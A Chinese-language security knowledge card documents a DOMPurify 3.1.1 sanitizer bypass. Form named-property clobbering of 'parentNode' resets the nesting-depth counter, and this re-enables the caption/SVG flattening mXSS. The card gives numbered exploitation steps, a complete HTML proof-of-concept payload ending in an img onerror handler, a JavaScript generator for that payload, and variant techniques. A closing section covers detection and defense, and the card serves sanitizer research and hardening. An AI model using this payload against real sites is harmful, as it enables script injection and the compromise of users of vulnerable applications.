---
id: web-generic-xss-dompurify-parentnode-clobbering-depth-bypass
title: DOMPurify 3.1.1 深度限制绕过：form 命名属性劫持 parentNode 重新计数触发 mXSS
type: scenario
domain: web
path: web/generic/xss
technique: dompurify-parentnode-clobbering-depth-bypass
aliases:
- DOMPurify 3.1.1 绕过
- parentNode 劫持
- DOM Clobbering 绕过深度检测
- MAX_NESTING_DEPTH 绕过
- form 命名属性
- deep-nesting fix bypass
- mXSS 绕过
tags:
- web
- xss
- dompurify
- dom-clobbering
- mxss
- html-sanitizer
- deep-nesting
- form
cve: []
severity: high
confidence: high
affected_versions: DOMPurify 3.1.1（原文测试）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:41:27+08:00'
  notes: 已对照原文核对：payload三段div(200/200/105)+form/input name=parentNode+<form></form><form>与原文一致；图14/15确认3.1.1 MAX_NESTING_DEPTH与_sanitizeShadowDOM依赖parentNode.__depth计数，卡内'255×3=765'与重置逻辑对应。未验证点：原文未给3.1.1最终执行截图（仅代码与推演），未本机浏览器复跑；form命名属性覆盖parentNode的具体浏览器行为依实现；frontmatter无sources/source_url。
---

## 一句话结论

DOMPurify 3.1.1 为修复 512 层扁平化 mXSS 增加了 `MAX_NESTING_DEPTH` 深度计数，但计数依赖 `shadowNode.parentNode.__depth`；攻击者用 `<form><input name="parentNode"></form>` 让表单的命名属性 `parentNode` 返回 `<input>` 元素（其 `__depth` 为 undefined），即可把深度计数反复重置为 1，再借 `<form>` 不允嵌套的解析突变多获得一次重置，真实约 765 层被当成三段 255 层放过，最终再次触发 caption 扁平化 mXSS 执行 `<img onerror>`。

## 原理

- DOMPurify 3.1.1 的 `_sanitizeShadowDOM` 在遍历节点时维护 `__depth`：
  - 若 `shadowNode.parentNode && shadowNode.parentNode.__depth` 存在，则 `__depth = 父.__depth + 1`；
  - 否则 `__depth = 1`；
  - 当 `__depth >= MAX_NESTING_DEPTH`（512）时 `_forceRemove(currentNode)`。
- HTMLFormElement 对带 `name` 的子控件提供命名属性访问：`<form id="f"><input name="parentNode"></form>` 中，`f.parentNode` 不再返回真实父节点，而是返回那个 `<input>` 元素。`input.__depth` 是 undefined，于是 sanitizer 进入 `else` 分支，把当前节点深度重置为 1。
- 每插入一次这样的 form/input，计数器就会清零一次。原文用两段约 200 层 div + form/input 把计数压在两段 255 以内（255×2=510 < 512，仍差两层），再利用 `<form></form><form>...` 在第一次解析时被“表单不可嵌套”规则纠正为多一层 form，获得第三次 `parentNode` 劫持，使总计数变成 255×3=765 而每段都不触发阈值。
- 深度检测被绕过之后，payload 回到 3.1.0 的利用路径：`table>caption>svg>desc` 加嵌套 `table>caption` 在扁平化时把 `<style>` 内文本弹入 HTML 命名空间，第二次解析 `</svg></style>` 闭合 style，`<img src onerror=alert(1)>` 成为真实元素执行。
- 根因是“用可被 DOM 命名属性覆盖的 DOM 属性（`parentNode`）保存安全状态”。命名属性优先级高于继承来的 getter，任何以元素属性作为可信控制流的 sanitizer 都可能被同类手法干扰。

## 触发条件

- 目标使用 DOMPurify 3.1.1（带 `MAX_NESTING_DEPTH` 深度检测、但尚未加入 DOM clobbering 拦截的版本）。
- 存在 HTML 注入点，净化结果会被插入 DOM 进行第二次解析。
- 允许 `<form>`、`<input>` 及其 `name` 属性；若 `FORBID_TAGS` 禁止 form/input 或 `FORBID_ATTR` 禁止 name，链条断裂。
- 浏览器支持表单命名属性访问（主流浏览器均支持），并遵循 512 层扁平化与 caption 插入模式。

## 利用步骤

1. 确认 DOMPurify 版本为 3.1.1，且输出会二次写入 DOM。
2. 构造三段嵌套：约 200 层 div + `<form><input name="parentNode">`，再约 200 层 div + `<form></form><form><input name="parentNode">`，最后约 105 层 div + `table/caption/svg/desc` 的 mXSS 结构。
3. 在 `desc` 下放嵌套 `<table><caption></caption></table>`，在 `svg` 下放 `<style><a title="</svg></style><img src onerror=alert(1)>"></a></style>`。
4. 提交给 DOMPurify 净化：由于每段深度都被 `parentNode` 劫持重置，节点不会被 `_forceRemove`，`img` 仍作为 style 文本保留。
5. 净化结果插入页面后，第二次解析发生扁平化与 caption 弹出，`img` 进入 HTML 命名空间执行 `onerror`。
6. 若未触发，检查 form/input/name 是否被过滤，并按目标浏览器调整每段 div 层数。

## PoC

以下 `<!-- div×N -->` 表示连续 N 个 `<div>`：

```html
<!-- div×200 -->
<form><input name="parentNode">
<!-- div×200 -->
<form></form><form><input name="parentNode">
<!-- div×105 -->
<table>
  <caption>
    <svg>
      <desc>
        <table><caption></caption></table>
      </desc>
      <style><a title="</svg></style><img src onerror=alert(1)>"></a></style>
    </svg>
  </caption>
</table>
```

生成骨架：

```javascript
const payload =
  '<div>'.repeat(200) + '<form><input name="parentNode">' +
  '<div>'.repeat(200) + '<form></form><form><input name="parentNode">' +
  '<div>'.repeat(105) +
  '<table><caption><svg><desc><table><caption></caption></table></desc>' +
  '<style><a title="</svg></style><img src onerror=alert(1)>"></a></style>' +
  '</svg></caption></table>';
```

关键验证（在浏览器控制台）：

```javascript
const f = document.querySelector('form');
f.parentNode;            // 期望是 <input name="parentNode">，而不是真实父 div
f.parentNode.__depth;    // undefined，导致 sanitizer 深度计数重置
```

## 变体与关联

- 变体：把 `parentNode` 换成 sanitizer 使用的其他 DOM 属性名（如 `parentElement`、`attributes`、`children`），只要该属性名可被表单命名属性或 DOM clobbering 覆盖。
- 变体：`<form id="form"><input id="attributes">` 可让 `form.attributes` 返回 input 元素，干扰按 `el.attributes` 遍历属性的过滤器（原文提到该手法用于 CTF 题）。
- 变体：除 form/input 外，`<img name=...>`、`<embed>`、`<object>` 也能参与命名访问；iframe 的 name 可拿到其内部 window。
- 关联卡片：[[web-generic-xss-dompurify-mxss-caption-flattening]]（本卡绕过的深度修复所针对的原始 mXSS）、[[web-generic-xss-dom-clobbering-window-name-collision]]（命名属性覆盖全局变量的基础机制）。
- 边界：DOMPurify 后续版本增加了对 DOM clobbering 的拦截与正则过滤，本 payload 只对 3.1.1 及相近版本有效；高版本需重新验证。

## 检测与防御

- 检测：审计净化输入中同时出现 `<form>`/`<input name="parentNode">`、超深 div 嵌套、`table/caption + svg/desc` 组合；在 sanitizer 遍历中校验 `node.parentNode instanceof Node` 或使用 WeakMap 保存父引用，避免命名属性干扰。
- 防御：升级到最新 DOMPurify，不要只依赖 3.1.1 的深度修复；对不可信 HTML 设置 `FORBID_TAGS: ['form','input','button','select','textarea']` 与 `FORBID_ATTR: ['name','id','form']`；使用 `ALLOWED_TAGS` 强白名单，禁止 svg/math/style。
- 加固：服务端再做一次 HTML 白名单重建，不要只信任客户端 sanitizer；启用 Trusted Types 与严格 CSP 作为纵深防御。
